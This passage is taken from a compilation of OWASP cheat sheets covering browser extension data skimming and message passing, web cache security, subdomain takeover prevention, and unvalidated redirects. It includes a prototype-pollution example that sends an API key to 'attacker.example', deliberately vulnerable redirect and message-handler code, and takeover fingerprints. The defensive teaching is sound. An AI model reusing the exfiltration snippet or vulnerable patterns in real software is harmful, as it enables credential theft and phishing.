const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

#### Mitigation: DOM-based Data Skimming

Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.

Use secure alternatives such as:

- Popup: Display information in a popup UI that appears when the user clicks the extension's icon.
- Options Page: Use a dedicated options page for displaying user-specific data or settings.
- Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)

It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot).

Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.

### 12. Prototype-based Data Skimming

#### Vulnerability: Prototype-based Data Skimming

An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a `<script>` tag directly to DOM with `src` attribute pointing to a script of [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources).

When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.

The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.

This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.

#### Example: Prototype-based Data Skimming

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

#### Mitigation: Prototype-based Data Skimming

Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use `window.postMessage`, because it can be overwritten also and malicious scripts can add listeners for `message` event.

Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.

Also, please don't assume your extension's script can use native prototypes even if it's executed at `document_start` timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at `document_start` ([official bug issue](https://issues.chromium.org/issues/40202434)).

### 13. Insecure Message Passing

#### Vulnerability: Insecure Message Passing

Browser extensions often rely on message passing (`chrome.runtime.sendMessage/onMessage`) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys).

#### Example: Insecure Message Passing

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

#### Mitigation: Insecure Message Passing

Treat all incoming messages as untrusted input.
In Service Workers, always:

- Validate `sender.id` to ensure the message originates from your own extension.
- Validate `sender.url` or `sender.origin` to restrict which extension pages or content scripts may communicate.
- Avoid allowing webpages to indirectly influence privileged logic through content scripts.
- Perform strict validation and allow-listing of `request.action` and all request parameters.

Chrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

## Web Cache Security

> **Source:** [Web Cache Security](https://cheatsheetseries.owasp.org/cheatsheets/Web_Cache_Security_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

HTTP caches improve performance by reusing stored responses in browsers, reverse proxies, content delivery networks (CDNs), and application data stores. A cache becomes a security boundary when it serves a response to a request other than the one that originally produced it. The [HTTP caching specification](https://www.rfc-editor.org/rfc/rfc9111.html) defines the behavior of private and shared caches, while the [MDN HTTP caching guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching) provides practical examples of common directives.

This cheat sheet focuses on preventing sensitive data exposure, web cache poisoning, web cache deception, and cross-tenant data leakage. It applies to developers and operators configuring origin applications, reverse proxies, CDNs, and application-level caches.

### Key Risks

The [security considerations in RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html#name-security-considerations) describe caches as attractive attack targets because one stored response can affect many users. [OWASP's cache poisoning overview](https://owasp.org/www-community/attacks/Cache_Poisoning) also explains how a harmful cached response can be distributed to other visitors.

- **Sensitive response exposure**: A shared cache stores a personalized or authenticated response and returns it to another user.
- **Web cache poisoning**: An attacker-controlled request input changes a response but is excluded from the cache key. The harmful response is then served to other users.
- **Web cache deception**: A dynamic or personalized URL is made to look like a static asset, causing an intermediary to cache sensitive content.
- **Cache key confusion**: The cache and origin disagree about URL normalization, query parameters, headers, or request routing, causing unrelated requests to share an entry.
- **Cross-tenant leakage**: An application cache omits the tenant or authorization context from its key.
- **Stale security state**: Cached content remains accessible after permissions, account state, or the underlying resource changes.

### Best Practices

Treat cacheability and cache-key design as part of the application's authorization model. [RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html) specifies how response directives, request inputs, and validation control whether a stored response can be reused.

#### 1. Classify Responses Before Caching

Define an explicit policy for every route. Default to preventing shared caching for authenticated, personalized, tenant-specific, or otherwise sensitive responses.

- Use `Cache-Control: no-store` when a response must not be stored by any compliant cache.
- Use `Cache-Control: private` when a response may be stored by a user's private cache but not by a shared cache.
- Remember that `no-cache` permits storage but requires successful validation before reuse. It does not mean "do not store."
- Do not assume that cookies make a response private. A `Set-Cookie` header alone does not prevent caching.
- Do not mark a response influenced by `Authorization` or session cookies as `public`, or give it an `s-maxage`, unless sharing the response has been deliberately designed and reviewed.
- Purge previously stored entries when changing a route to `no-store`; the directive does not delete old entries.

For a response containing sensitive data:

```http
Cache-Control: no-store
```

For non-sensitive content that may be stored only in a private cache and must be revalidated:

```http
Cache-Control: private, no-cache
```

#### 2. Design a Complete Cache Key

Every request input that can change a cacheable response must either be represented in the cache key or be rejected for that route.

- Include the request method, scheme, host, normalized path, and all relevant query parameters.
- Use [`Vary`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Vary) for representation-selecting headers such as `Accept-Encoding` or `Accept-Language`.
- Do not use `Vary: Cookie` as a general authorization boundary. Prefer disabling shared caching for personalized responses.
- Derive tenant and user identifiers from trusted, authenticated server-side context, not directly from an untrusted header or query parameter.
- Apply the same URL normalization and parameter handling at the CDN, reverse proxy, and origin.
- Reject ambiguous requests, including conflicting host information, duplicate parameters with inconsistent meanings, and malformed path encodings.

For an application-level cache, use a structured, versioned key:

```text
<environment>:<resource-version>:<tenant-id>:<resource-type>:<resource-id>
```

Do not put session tokens, API keys, or other secrets in cache keys because keys often appear in logs and administrative interfaces.

#### 3. Prevent Web Cache Poisoning

[Cloudflare's cache poisoning guidance](https://developers.cloudflare.com/cache/cache-security/avoid-web-poisoning/) describes the central design rule: untrusted request inputs that are not part of the cache key must not influence a cacheable response.

- Cache only routes that are explicitly intended to be shared.
- Do not let unkeyed headers or a body on a `GET` request alter a cacheable response.
- Trust `Forwarded` and `X-Forwarded-*` headers only when they were added or replaced by a trusted proxy.
- Canonicalize the host and scheme before using them to generate links, redirects, or security-sensitive headers.
- Do not reflect unvalidated request metadata into cached HTML, JSON, redirects, or response headers.
- Separate static assets and dynamic application routes by hostname or an unambiguous path namespace where practical.
- If poisoning occurs, purge every affected cache layer and fix the key or origin behavior before re-enabling caching.

#### 4. Prevent Web Cache Deception

Web cache deception occurs when an attacker causes a shared cache to store personalized content under a URL that appears cacheable. [Cache Deception Armor](https://developers.cloudflare.com/cache/cache-security/cache-deception-armor/) documents one mitigation: verifying that the requested file extension agrees with the response `Content-Type`.

- Base cache eligibility on an allowlisted route and response policy, not only on a file extension.
- Make dynamic routes reject unexpected path segments and static-looking suffixes instead of silently routing them to the same handler.
- Ensure that a request such as `/account/profile/image.css` cannot resolve to the same personalized handler as `/account/profile`.
- Verify that the URL extension and response `Content-Type` agree before caching a static asset.
- Ignore or remove query parameters from a cache key only after proving that they cannot change routing, authorization, or response content.

#### 5. Coordinate Origin and Intermediary Policies

A secure origin policy can be weakened by a CDN rule, reverse proxy override, or framework default. [MDN's caching guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching) recommends explicitly controlling caching rather than relying on heuristic behavior.

- Define browser and shared-cache lifetimes independently with the appropriate directives.
- Review CDN rules that override origin `Cache-Control` headers or cache responses by status code, path pattern, or file extension.
- Give error pages, redirects, and authentication responses explicit cache policies.
- Use consistent URL normalization at every layer. When a CDN normalizes its cache key, send the normalized form to the origin as well.
- Maintain a tested purge mechanism for individual keys, tags, or narrowly scoped route groups.
- Fail closed when a sensitive route has a missing, malformed, or conflicting cache policy.

#### 6. Protect Application-Level Caches

In-memory, database, and distributed caches can leak data even when HTTP caching is disabled. Authorization must still be enforced on every request before cached data is returned. See the [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) and [Multi-Tenant Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multi_Tenant_Security_Cheat_Sheet.html) for related controls.

- Namespace keys by environment and application to prevent collisions.
- Include tenant identity and every authorization-relevant resource dimension in the key.
- Do not let a cache hit bypass object-level or tenant-level authorization.
- Avoid caching final authorization decisions unless the key includes the complete subject, object, action, policy version, and a tightly bounded lifetime.
- Version key formats so schema or permission-model changes cannot reuse incompatible entries.
- Restrict administrative access to cache contents, configuration, statistics, and purge operations.

#### 7. Test the Complete Cache Path

Test through the same CDN and proxy path used in production. The [Cloudflare cache-key documentation](https://developers.cloudflare.com/cache/how-to/cache-keys/) illustrates how scheme, host, path, query parameters, headers, and cookies can contribute to a cache key.

- Request the same URL as two different users and tenants; neither response may contain the other's data.
- Change one header, query parameter, cookie, or path component at a time and verify the expected cache behavior.
- Append static-looking suffixes and unexpected path segments to authenticated routes and verify that they are rejected and not cached.
- Test authorization changes, logout, content updates, and purge operations against already stored entries.
- Monitor for unexpected cache hits on authenticated routes, abrupt hit-ratio changes, unusual forwarded headers, and repeated purge activity.
- Log enough cache-status and routing metadata to investigate incidents, but never log secrets or full sensitive response bodies.

### Do's and Don'ts

Use these checks alongside the [HTTP caching requirements in RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html) and the application's normal authorization review.

**Do:**

- Set an explicit `Cache-Control` policy on every security-relevant response.
- Verify that every response-changing input is included in the cache key or rejected.
- Keep cache and origin routing rules consistent.
- Authorize the current request before returning cached application data.
- Test with multiple identities and tenants through the production caching path.
- Plan and test targeted cache invalidation before an incident occurs.

**Don't:**

- Assume that authentication, cookies, TLS, or `Set-Cookie` automatically prevents caching.
- Cache every URL with a static-looking extension.
- Allow unkeyed request metadata to influence shared responses.
- Treat `Vary: Cookie` as a substitute for an authorization design.
- Include credentials or session identifiers in keys, logs, or purge URLs.
- Assume that purging a poisoned entry fixes the underlying vulnerability.

## Subdomain Takeover Prevention

> **Source:** [Subdomain Takeover Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Subdomain takeover is a vulnerability that occurs when a DNS record (typically a CNAME) points to a cloud resource or third-party service that has been deprovisioned or no longer exists. An attacker can claim the orphaned resource and serve arbitrary content on the victim's subdomain.

This vulnerability is consistently among the most reported findings in bug bounty programs. Despite being well understood, it remains prevalent because it is fundamentally an operational problem: teams create DNS records when spinning up services but rarely have processes to clean them up during decommissioning.

The impact extends far beyond serving a defacement page. An attacker controlling a subdomain can:

- **Steal session cookies** scoped to the parent domain (e.g., cookies set on `.example.com` are sent to `attacker-controlled.example.com`)
- **Bypass Content Security Policy** rules that trust wildcard subdomains (`*.example.com`)
- **Host convincing phishing pages** on a domain the organization's users and customers already trust
- **Compromise OAuth and SSO flows** that whitelist the subdomain as a valid redirect URI
- **Obtain valid TLS certificates** for the subdomain from Certificate Authorities that use HTTP or email-based domain validation
- **Receive email** addressed to the subdomain if MX records are involved, enabling password resets or account verification on third-party services

This cheat sheet provides practical guidance for developers, DevOps engineers, and infrastructure teams to prevent subdomain takeovers, detect dangling records before attackers do, and respond effectively when they are discovered.

### How Subdomain Takeover Works

#### The Basic Mechanism

1. An organization creates a DNS record: `blog.example.com CNAME example-blog.herokuapp.com`
2. The Heroku app serves content on `blog.example.com`
3. Months later, the team decommissions the Heroku app but forgets to remove the DNS record
4. The CNAME still points to `example-blog.herokuapp.com`, which no longer exists
5. An attacker creates a new Heroku app with the name `example-blog` and claims the hostname
6. The attacker now controls what is served on `blog.example.com`

#### Why It Keeps Happening

The root cause is almost always a disconnect between infrastructure provisioning and DNS management:

- **Cloud resources are temporary, DNS records are persistent.** Teams spin up and tear down services frequently, but DNS records tend to accumulate unless explicitly managed.
- **Different teams own different parts.** The team that created the cloud resource may not have access to DNS management, and the team that manages DNS may not know the resource was removed.
- **No automated link between resources and DNS.** Most organizations have no mechanism to detect when a DNS target stops existing.
- **Shadow IT and forgotten proof-of-concepts.** Developers create temporary subdomains for testing or demos and never clean them up.
- **Mergers, acquisitions, and reorganizations.** DNS zones inherited from acquired companies are often poorly inventoried, and the original infrastructure owners are no longer available.

#### Record Types at Risk

- **CNAME records** are the most common vector. If the canonical name resolves to a service that can be claimed, takeover is possible.
- **A records** pointing to released IP addresses can be vulnerable if the IP is reassigned and the attacker obtains it. This is common in cloud environments where elastic IPs are released back to the provider's pool.
- **NS records** delegating a subdomain to a third-party DNS provider are particularly dangerous. If the account at the DNS provider is closed, anyone who creates a new account can potentially claim the delegated zone and control all records under that subdomain.
- **MX records** pointing to deprovisioned mail services can allow an attacker to receive email for the subdomain. Beyond intercepting password reset emails, this enables a more severe attack: most Certificate Authorities accept email-based domain validation (DV) using addresses like `admin@subdomain.example.com`. An attacker controlling MX records can complete DV challenges and obtain legitimate TLS certificates for the subdomain, enabling transparent HTTPS phishing or man-in-the-middle attacks.

### Cloud Provider Vulnerability Reference

Not all cloud services are equally vulnerable. The key factor is whether the service allows a new customer to claim a previously used hostname or resource name. This table is a snapshot; cloud providers continuously update their policies, so always verify current behavior against the community-maintained [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) repository.

#### High Risk: Takeover Possible When Resource Is Removed

| Provider/Service | Vulnerable Resource | Indicator (CNAME Target) | Takeover Mechanism |
|---|---|---|---|
| AWS S3 (Website Hosting) | S3 bucket | `*.s3.amazonaws.com`, `*.s3-website-*.amazonaws.com` | Bucket names are globally unique across all AWS accounts. If a bucket is deleted, any AWS account can recreate it with the same name and serve content on the CNAME. |
| AWS Elastic Beanstalk | Environment | `*.elasticbeanstalk.com` | Environment CNAMEs are globally unique and released on environment termination. An attacker can create a new environment with the same CNAME prefix. |
| Azure App Service | Web App | `*.azurewebsites.net` | App names are globally unique. After deletion, any Azure tenant can create a new app with the same name. Azure offers a [domain verification mechanism](https://learn.microsoft.com/en-us/azure/app-service/app-service-web-tutorial-custom-domain) to mitigate this; see Prevention Strategies. |
| Azure Traffic Manager | Profile | `*.trafficmanager.net` | Profile names are globally unique and reclaimable after deletion. |
| Azure CDN | Endpoint | `*.azureedge.net` | Endpoint names are globally unique. A deleted endpoint name can be registered by another tenant. |
| GitHub Pages (Custom Domains) | Unverified custom domain | `*.github.io` | Takeover can occur when a domain still points to GitHub Pages after its repository is deleted or Pages is disabled, and the domain is not verified. [Account or organization domain verification](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages) prevents other GitHub users from publishing to the verified domain and its immediate subdomains. |
| Heroku | App | `*.herokuapp.com` | App names are globally unique and released on app deletion. Any Heroku account can claim the name. |
| Shopify | Store | `shops.myshopify.com` | Custom domain associations can be claimed by any Shopify store. |
| Netlify | Site | `*.netlify.app`, `*.netlify.com` | Site names are reclaimable after deletion. |
| Fastly | CDN service | `*.fastly.net`, `*.global.ssl.fastly.net` | An attacker with a Fastly account can add the victim's domain to their own Fastly service configuration. |
| Zendesk | Support portal | `*.zendesk.com` | Support portal subdomain names can be reclaimed by new Zendesk accounts. |
| Cargo Collective | Portfolio | `*.cargocollective.com` | Portfolio names are reclaimable. |
| Tumblr | Blog | `*.tumblr.com` | Custom domain associations are released when a blog is deleted. |

#### Conditional Risk: Takeover Possible Under Specific Circumstances

| Provider/Service | Condition | Details |
|---|---|---|
| AWS CloudFront | Dangling DNS alone does not establish claimability | Adding a new alternate domain name requires an attached trusted, valid TLS certificate covering that name. [CloudFront checks the certificate subject alternative name](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html). Verify these prerequisites rather than treating a deleted distribution as sufficient evidence of takeover, and remove stale DNS records. |
| AWS Route 53 (NS Delegation) | NS delegation to deleted hosted zone | If a subdomain's NS records delegate to a Route 53 hosted zone that has been deleted, an attacker can create a new hosted zone for the same subdomain and may receive the same NS server assignments, effectively taking control of all DNS records for that subdomain. |
| Google Cloud Storage | Bucket deleted | GCS bucket names are globally unique and can be reclaimed after deletion. Google imposes rate limits on bucket creation and may temporarily reserve recently deleted names, but this is not a documented security guarantee and should not be relied upon as a protection. Remove DNS records when decommissioning GCS buckets. |
| Cloudflare | Misconfigured SaaS setup | Standard Cloudflare usage requires domain ownership verification via nameserver delegation. However, Cloudflare for SaaS (custom hostnames) configurations should use the [custom hostname verification](https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/security/certificate-management/) feature to prevent hostname claim conflicts. |

#### Service Fingerprints for Detection

When scanning for potential subdomain takeovers, look for these distinctive error responses that indicate the backend resource no longer exists:

| Service | Error Response Pattern |
|---|---|
| AWS S3 | `NoSuchBucket`, `The specified bucket does not exist` |
| GitHub Pages | `There isn't a GitHub Pages site here.` |
| Heroku | `No such app`, `herokucdn.com/error-pages/no-such-app.html` |
| Azure App Service | `404 Web Site not found` on `*.azurewebsites.net` |
| Shopify | `Sorry, this shop is currently unavailable.` |
| Netlify | `Not Found - Request ID:` |
| Fastly | `Fastly error: unknown domain:` |
| Zendesk | `Help Center Closed` |

### Prevention Strategies

#### 1. Manage DNS Record Lifecycle During Decommissioning

The correct order of operations when decommissioning a service is:

1. **Redirect or serve a maintenance page** at the subdomain to avoid broken links and user confusion during the transition period
2. **Update or remove the DNS record** pointing to the resource
3. **Wait for DNS propagation** (at least the TTL duration, typically 300 to 3600 seconds)
4. **Then decommission the cloud resource**

The common mistake is doing these steps in reverse: deleting the cloud resource first, which creates an immediate window for takeover that persists until someone notices the dangling record.

In practice, immediately deleting the DNS record can cause disruption if the subdomain is linked from other pages, bookmarked by users, or indexed by search engines. Pointing the record to an internal server that returns an HTTP redirect to the main domain or a simple maintenance page is a reasonable intermediate step that eliminates the takeover risk while preserving a functional user experience during the transition.

#### 2. Maintain a DNS Inventory Linked to Resource Ownership

Keep a documented mapping between DNS records and the cloud resources they point to:

- **What resource** does each CNAME, A, or NS record resolve to?
- **Which team** owns the resource?
- **What project or service** is it part of?
- **When** was it created and when is it expected to be decommissioned?
- **What is the business justification** for the subdomain?

This can be as simple as a spreadsheet for small organizations or integrated into a Configuration Management Database (CMDB) for larger ones. The critical requirement is that it is consulted and updated during every infrastructure change. Infrastructure-as-Code tools like Terraform, Pulumi, or AWS CDK can also serve as a living inventory when DNS records and cloud resources are managed in the same codebase.

#### 3. Implement Automated Dangling Record Detection

Regularly scan DNS records to identify entries pointing to non-existent resources:

- **Scheduled scans:** Run automated checks daily or weekly against all DNS records to verify that targets still resolve and respond with expected content, not cloud provider error pages.
- **CI/CD integration:** Add DNS validation to deployment and teardown pipelines. When a service is removed, the pipeline should verify that associated DNS records are also removed before marking the decommissioning as complete.
- **DNS change monitoring:** Alert when new CNAME records are created and when target resources return errors such as HTTP 404, NXDOMAIN, or cloud provider default error pages.

Open-source tools for detection:

- [dnsReaper](https://github.com/punk-security/dnsReaper): Actively maintained subdomain takeover scanner supporting 40+ service fingerprints with signature-based detection
- [nuclei](https://github.com/projectdiscovery/nuclei): General-purpose vulnerability scanner with a dedicated set of [subdomain takeover detection templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/dns)
- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz): Community-maintained reference documenting which services are and are not vulnerable, with proof-of-concept details

#### 4. Use Domain Verification Where Available

Several cloud providers offer domain verification mechanisms that prevent unauthorized users from associating a custom domain with their account. When available, these provide a strong defense layer:

- **Azure App Service:** Supports [custom domain verification via TXT records](https://learn.microsoft.com/en-us/azure/app-service/app-service-web-tutorial-custom-domain). Adding a verification TXT record (e.g., `asuid.subdomain TXT <verification-id>`) ties the custom domain to a specific Azure subscription. Keep this TXT record in place even after decommissioning the App Service to prevent another tenant from claiming the domain.
- **Google Cloud:** Many GCP services require domain verification through Google Search Console or a DNS TXT record before a custom domain can be associated. Retain verification records as long as the DNS record exists.
- **Cloudflare:** Standard setup requires domain ownership via nameserver delegation. Cloudflare for SaaS configurations should use the [custom hostname verification](https://developers.cloudflare.com/cloudflare-for-platforms/cloudflare-for-saas/security/certificate-management/) feature.
- **GitHub Pages:** Verify the domain in the owning account or organization's Pages settings and retain the verification TXT record. This protects the verified domain and immediate subdomains, not arbitrary deeper names covered by wildcard DNS; see [GitHub's verification scope and instructions](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages).
- **AWS CloudFront:** [New alternate domain names require a trusted certificate covering the name](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html). A name already associated with another distribution cannot be added as the same alternate name. Continue removing stale DNS during decommissioning; protections differ across AWS services.

Where no domain verification is available, the DNS record itself is the only control. Removing it promptly on decommissioning is the only reliable protection.

#### 5. Restrict Wildcard DNS Records

Wildcard DNS records (`*.example.com`) are especially dangerous because they resolve for any subdomain, including those matching services that no longer exist. Any service that previously existed under the wildcard could potentially be taken over, and the organization may not even know which subdomains were in use.

Avoid wildcard records unless absolutely necessary. If required:

- Scope them as narrowly as possible (e.g., `*.staging.example.com` rather than `*.example.com`)
- Combine with a reverse proxy or load balancer that maintains an allowlist of valid hostnames and returns an error for unrecognized ones
- Monitor Certificate Transparency logs for unexpected certificate issuance on subdomains matching the wildcard

#### 6. Establish a Decommissioning Checklist

Create a formal checklist that teams must follow when removing any externally facing service:

- [ ] Identify all DNS records (CNAME, A, MX, NS, TXT) associated with the service
- [ ] Point the DNS record to a maintenance page or redirect (if immediate removal causes user-facing disruption)
- [ ] Remove or update DNS records
- [ ] Wait for DNS propagation (at least the TTL duration)
- [ ] Decommission the cloud resource
- [ ] Revoke or let expire any SSL/TLS certificates issued for the subdomain
- [ ] Update the DNS inventory documentation
- [ ] Remove the subdomain from any OAuth redirect URI allowlists, CSP directives, or CORS configurations
- [ ] Verify that the subdomain no longer resolves or returns expected content
- [ ] Run a takeover detection scan against the subdomain to confirm it is not claimable

#### 7. Limit the Blast Radius with Proper Security Scoping

Even if a subdomain takeover occurs, limit the damage by properly scoping security controls:

- **Cookies:** Do not scope session cookies to the parent domain (`.example.com`) unless necessary. Prefer setting cookies on the specific fully qualified subdomain (`app.example.com`). Use the `__Host-` cookie prefix where possible, which restricts the cookie to the exact origin.
- **Content Security Policy:** Avoid using `*.example.com` in CSP directives. Explicitly list trusted subdomains. A taken-over subdomain matching a CSP wildcard allows the attacker to inject scripts or exfiltrate data without violating the policy.
- **CORS:** Do not use wildcard subdomain patterns in `Access-Control-Allow-Origin` validation. Validate against an explicit allowlist of trusted origins.
- **OAuth/SSO:** Do not whitelist entire subdomain patterns in redirect URI validations. Use exact-match redirect URIs. A taken-over subdomain in an OAuth redirect allowlist enables token theft.
- **Email (SPF/DKIM/DMARC):** If SPF records include mechanisms that match the taken-over subdomain's IP, the attacker can send SPF-authenticated email appearing to originate from your domain.

### Monitoring and Detection

#### Continuous DNS Monitoring

Implement ongoing monitoring to catch dangling records before attackers do:

- **Compare DNS records against live resources.** For every CNAME in your zone, verify the target still exists and responds with expected content rather than a cloud provider error page.
- **Monitor for service fingerprints.** The error responses listed in the Service Fingerprints table above are strong indicators that a resource has been removed while the DNS record remains. Automated scanning for these patterns should run at least weekly.
- **Track DNS zone changes.** Use version-controlled DNS management (e.g., Terraform, OctoDNS, or DNSControl) so all record additions and removals are reviewed, approved, and logged. This also creates an audit trail for investigating how a dangling record was introduced.
- **Monitor Certificate Transparency logs.** Use services like [crt.sh](https://crt.sh) or [certspotter](https://sslmate.com/certspotter/) to alert on any certificate issuance for your subdomains. An unexpected certificate issued for a subdomain you don't control is a strong indicator that takeover has already occurred or is in progress.

#### Indicators of Compromise

Signs that a subdomain may have already been taken over:

- Subdomain suddenly serves unexpected content, a parking page, or a different application than expected
- SSL/TLS certificate for the subdomain was issued to an unknown entity or organization (visible in Certificate Transparency logs)
- Users report phishing emails or pages appearing to come from the subdomain
- Web application firewall or proxy logs show the subdomain resolving to an IP address outside your known infrastructure ranges
- DMARC aggregate reports show email being sent from the subdomain that your organization did not originate

### Incident Response

If a subdomain takeover is discovered:

1. **Remove the DNS record immediately.** This is the fastest mitigation. It breaks the link between your domain and the attacker's resource. If the record cannot be removed quickly, update it to point to an IP or CNAME you control.
2. **Revoke or request revocation of any certificates** issued for the subdomain during the takeover period. Check Certificate Transparency logs to identify all certificates that were issued.
3. **Assess the impact.** Determine whether cookies scoped to the parent domain could have been stolen, whether phishing content was served and for how long, whether any OAuth or SSO flows referenced the subdomain, and whether the attacker could have received email for the subdomain (MX-based takeover).
4. **Notify affected users** if there is evidence that sensitive data was exposed, credentials were phished, or session cookies were intercepted.
5. **Investigate the root cause.** Identify the process gap that allowed the dangling record to persist and update decommissioning procedures to prevent recurrence.
6. **Scan all DNS zones** owned by the organization for other dangling records. The same process gap likely affects other subdomains.
7. **Document the incident** with a timeline, impact assessment, and corrective actions for internal review and to improve organizational response to future occurrences.

## Unvalidated Redirects and Forwards

> **Source:** [Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.

Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access.

### Safe URL Redirects

When we want to redirect a user automatically to another page (without an action of the visitor such as clicking on a hyperlink) you might implement a code such as the following:

Java

```java
response.sendRedirect("http://www.mysite.com");
```

PHP

```php
<?php
/* Redirect browser */
header("Location: http://www.mysite.com");
/* Exit to prevent the rest of the code from executing */
exit;
?>
```

ASP .NET

```csharp
Response.Redirect("~/folder/Login.aspx")
```

Rails

```ruby
redirect_to login_path
```

Rust actix web

```rust
  Ok(HttpResponse::Found()
        .insert_header((header::LOCATION, "https://mysite.com/"))
        .finish())
```

In the examples above, the URL is being explicitly declared in the code and cannot be manipulated by an attacker.

### Dangerous URL Redirects

The following examples demonstrate unsafe redirect and forward code.

#### Dangerous URL Redirect Example 1

The following Java code receives the URL from the parameter named `url` ([GET or POST](https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String-)) and redirects to that URL:

```java
response.sendRedirect(request.getParameter("url"));
```

The following PHP code obtains a URL from the query string (via the parameter named `url`) and then redirects the user to that URL. Additionally, the PHP code after this `header()` function will continue to execute, so if the user configures their browser to ignore the redirect, they may be able to access the rest of the page.

```php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
```

A similar example of C\# .NET Vulnerable Code:

```csharp
string url = request.QueryString["url"];
Response.Redirect(url);
```

And in Rails:

```ruby
redirect_to params[:url]
```

Rust actix web

```rust
  Ok(HttpResponse::Found()
        .insert_header((header::LOCATION, query_string.path.as_str()))
        .finish())
```

The above code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site.

If no validation is applied, a malicious user could create a hyperlink to redirect your users to an unvalidated malicious website, for example:

```text
 http://example.com/example.php?url=http://malicious.example.com
```

The user sees the link directing to the original trusted site (`example.com`) and does not realize the redirection that could take place

#### Dangerous URL Redirect Example 2

